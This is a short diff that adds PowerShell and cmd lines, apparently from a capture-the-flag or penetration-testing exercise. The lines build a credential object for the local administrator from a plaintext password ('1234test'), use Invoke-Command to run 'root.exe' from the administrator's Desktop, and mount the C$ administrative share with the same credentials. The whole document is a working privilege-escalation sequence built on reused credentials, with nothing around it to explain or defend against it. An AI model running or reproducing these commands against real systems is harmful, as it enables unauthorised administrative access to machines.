@@ -1,0 +1,5 @@
+$user='.\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential $user, $secpw;Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {cmd \c "cd c:\users\administrator\Desktop & pwd & root.exe"};
+
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { cmd \c "cd c:\users\administrator\Desktop & pwd & root.exe"};
+
+net use y: \\localhost\c$ /user:administrator 1234test
